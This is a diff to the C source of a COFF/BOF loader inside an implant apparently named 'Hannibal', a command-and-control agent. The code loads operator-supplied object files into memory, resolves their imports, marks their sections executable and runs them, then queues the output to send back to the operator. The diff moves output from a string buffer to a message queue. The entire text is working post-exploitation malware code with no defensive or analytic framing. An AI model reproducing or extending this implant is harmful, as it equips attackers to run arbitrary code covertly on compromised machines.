@@ -27,7 +27,7 @@ typedef struct _OBJECT_CTX {
 	PIMAGE_SECTION_HEADER Sections;
 } OBJECT_CTX, *POBJECT_CTX;
 
-SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, LPCWSTR buffer_message, PSTR Symbol) 
+SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, PMESSAGE_QUEUE queue, PSTR Symbol) 
 {
 	HANNIBAL_INSTANCE_PTR
     PSTR Function = { 0 };
@@ -94,7 +94,7 @@ SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, LPCWSTR buffer_message, 
 		pic_memcpy(Buffer, Symbol, pic_strlen(Symbol));
 
 		//
-		// replace the $ with a null byte 
+		// repSlace the $ with a null byte 
 		//
 		Position = pic_strchr(Buffer, '$');
 		*Position = 0;
@@ -110,7 +110,9 @@ SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, LPCWSTR buffer_message, 
 			if (!(Module = hannibal_instance_ptr->Win32.LoadLibraryA(Library))) {
 				// printf("[!] Module not found: %s\n", Library);
 			pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
-			pic_strcatW(buffer_message, DbgString);
+			// pic_strcatW(buffer_message, DbgString);
+			BeaconAddMessageToQueue(queue, DbgString);
+	
 			return NULL;
 			}
 		}
@@ -121,7 +123,8 @@ SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, LPCWSTR buffer_message, 
 		if (!(Resolved = hannibal_instance_ptr->Win32.GetProcAddress(Module, Function))) {
 			// printf("[!] Function not found inside of %s: %s\n", Library, Function);
 			pic_wsprintf(DbgString, L"[!] Function not found inside of %s: %s\n", Library, Function);
-			pic_strcatW(buffer_message, DbgString);
+			// pic_strcatW(buffer_message, DbgString);
+			BeaconAddMessageToQueue(queue, DbgString);
 			return NULL;
 		}
 	}
@@ -250,7 +253,7 @@ SECTION_CODE VOID ObjectRelocation(char *task_uuid, ULONG Type,  PVOID Reloc,  P
 	}
 }
 
-SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVOID args, int argc, LPCWSTR buffer_message) {
+SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVOID args, int argc, PMESSAGE_QUEUE queue) {
     HANNIBAL_INSTANCE_PTR
 
 	PVOID SecBase = { 0 };
@@ -287,9 +290,12 @@ SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVO
             // Check if the symbol starts with __imp_
             if (pic_strncmp("__imp_", Symbol, 6) == 0) {
                 // Resolve the imported function
-                if (!(Resolved = ObjectResolveSymbol(task_uuid, buffer_message, Symbol))) {
-                    pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
-                    pic_strcatW(buffer_message, DbgString);
+                if (!(Resolved = ObjectResolveSymbol(task_uuid, queue, Symbol))) {
+                    // pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
+                    // pic_strcatW(buffer_message, DbgString);
+
+					pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
+					BeaconAddMessageToQueue(queue, DbgString);
                     return FALSE;
                 }
             }
@@ -314,10 +320,10 @@ SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVO
     return TRUE;
 }
 
-SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVOID args, int argc, LPVOID file_args, LPCWSTR buffer_message) {
+SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVOID args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue) {
     HANNIBAL_INSTANCE_PTR
 	
-	VOID(*Main)(PBYTE, ULONG, LPVOID, LPCWSTR) = NULL;
+	VOID(*Main)(PBYTE, ULONG, LPVOID, PMESSAGE_QUEUE) = NULL;
     PIMAGE_SYMBOL ObjSym = { 0 };
     PSTR Symbol = { 0 };
     PVOID SecBase = { 0 };
@@ -348,19 +354,19 @@ SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVO
             if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
                 pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", 
                            hannibal_instance_ptr->Win32.GetLastError());
-				pic_strcatW(buffer_message, DbgString);
+				BeaconAddMessageToQueue(queue, DbgString);
                 break;
             }
 
             // Execute the BOF entry point
             Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);
-            Main((PBYTE)args, argc, file_args, buffer_message);
+            Main((PBYTE)args, argc, file_args, queue);
 
             // Revert the old section protection
             if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
                 pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", 
                            hannibal_instance_ptr->Win32.GetLastError());
-				pic_strcatW(buffer_message, DbgString);
+				BeaconAddMessageToQueue(queue, DbgString);
                 break;
             }
             return TRUE;
@@ -369,7 +375,7 @@ SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVO
     return FALSE;
 }
 
-SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc, LPVOID file_args, LPCWSTR buffer_message, PSTR sFunction)
+SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue, PSTR sFunction)
 {
 	HANNIBAL_INSTANCE_PTR	
 
@@ -402,7 +408,7 @@ SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc
 	//
 	if (ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
 		// printf("[*] object file is not x64");
-		pic_strcatW(buffer_message, L"[*] object file is not x64");
+		BeaconAddMessageToQueue(queue, L"[*] object file is not x64");
 		return FALSE;
 	}
 #else
@@ -414,8 +420,12 @@ SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc
 	
 	VirtSize = ObjectVirtualSize(task_uuid, &ObjCtx);
 	if (!(VirtAddr = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, VirtSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
+		
+		// pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
+		// // pic_strcatW(buffer_message, DbgString);
+		// BeaconAddMessageToQueue(queue, DbgString);
 		pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
-		pic_strcatW(buffer_message, DbgString);
+		BeaconAddMessageToQueue(queue, DbgString);
 		goto _END_OF_CODE;
 	}
 
@@ -424,8 +434,11 @@ SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc
 	// the section map array 
 	//
 	if (!(ObjCtx.SecMap = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP)))) {
+		// pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
+		// pic_strcatW(buffer_message, DbgString);
+
 		pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
-		pic_strcatW(buffer_message, DbgString);
+		BeaconAddMessageToQueue(queue, DbgString);
 		goto _END_OF_CODE;
 	}
 
@@ -459,15 +472,19 @@ SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc
 	//
 	ObjCtx.SymMap = SecBase;
 
-	if (!(Success = ObjectProcessSection(task_uuid, &ObjCtx, args, argc, buffer_message))) {
+	if (!(Success = ObjectProcessSection(task_uuid, &ObjCtx, args, argc, queue))) {
+		// pic_wsprintf(DbgString, L"[!] Failed to process sections\n");
+		// pic_strcatW(buffer_message, DbgString);
 		pic_wsprintf(DbgString, L"[!] Failed to process sections\n");
-		pic_strcatW(buffer_message, DbgString);
+		BeaconAddMessageToQueue(queue, DbgString);
 		goto _END_OF_CODE;
 	}
 
-	if (!(Success = ObjectExecute(task_uuid, &ObjCtx, sFunction, args, argc, file_args, buffer_message))) {
+	if (!(Success = ObjectExecute(task_uuid, &ObjCtx, sFunction, args, argc, file_args, queue))) {
+		// pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
+		// pic_strcatW(buffer_message, DbgString);
 		pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
-		pic_strcatW(buffer_message, DbgString);
+		BeaconAddMessageToQueue(queue, DbgString);
 		goto _END_OF_CODE;
 	}
 
@@ -491,18 +508,20 @@ _END_OF_CODE:
 	return Success;
 }
 
-SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int argc, LPVOID file_args, LPCWSTR buffer_message) 
+SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue) 
 {
 	HANNIBAL_INSTANCE_PTR
 
 	int status = FALSE;
-	status = ObjectLdr(task_uuid, pbof_content, args, argc, file_args, buffer_message, "go");
+	status = ObjectLdr(task_uuid, pbof_content, args, argc, file_args, queue, "go");
 
     if (!status) {
-        pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");
+        // pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");
+		BeaconAddMessageToQueue(queue, L"[!] Failed to execute object file\n");
     }
     else {
-        pic_strcatW(buffer_message, L"[+] Successfully executed object file\n");
+        // pic_strcatW(buffer_message, L"[+] Successfully executed object file\n");
+		BeaconAddMessageToQueue(queue, L"[+] Successfully executed object file\n"); 
     }
     return 0;
 }
@@ -528,33 +547,42 @@ SECTION_CODE void cmd_bof(TASK t)
 	// TODO: must include multiple files.
 	HANNIBAL_INSTANCE_PTR
     CMD_EXECUTE_BOF *exec_bof = (CMD_EXECUTE_BOF *)t.cmd;
-
-    LPCWSTR message_content = (LPCWSTR)hannibal_instance_ptr->Win32.VirtualAlloc(
-        NULL,
-        0x1000,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
-	pic_strcatW(message_content, L"[+] Attempt to execute BOF\n");
-    // Execute BOF directly with parameters
+	PMESSAGE_QUEUE queue = BeaconCreateMessageQueue();
+	if (!queue) {
+		return;
+	}
+    // LPCWSTR message_content = (LPCWSTR)hannibal_instance_ptr->Win32.VirtualAlloc(
+    //     NULL,
+    //     0x1000,
+    //     MEM_COMMIT,
+    //     PAGE_READWRITE
+    // );
+	// pic_strcatW(message_content, L"[+] Attempt to execute BOF\n");
+    BeaconAddMessageToQueue(queue, L"[+] Attempt to execute BOF\n");
+	// Execute BOF directly with parameters
     do_bof(
         t.task_uuid,
         exec_bof->bof,
 		exec_bof->args,
         exec_bof->argc,
 		exec_bof->file_args,
-        message_content
+        queue
     );
 
     // Cleanup
+	cleanup_file_args(exec_bof->file_args);
     hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
     hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
 	// hannibal_instance_ptr->Win32.VirtualFree(exec_bof->file_content, 0, MEM_RELEASE);
-	cleanup_file_args(exec_bof->file_args);
+	;
 	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
 	// pic_RtlSecureZeroMemory(message_content, sizeof(message_content));
-    hannibal_response(message_content, t.task_uuid);
-    hannibal_instance_ptr->Win32.VirtualFree(message_content, 0, MEM_RELEASE);
+    // hannibal_response(message_content, t.task_uuid);
+
+	// This supposed to clean up the information used.
+	BeaconSendAllMessages(queue, t.task_uuid);
+
+	BeaconCleanUpMessageQueue(queue);
 }
 
 
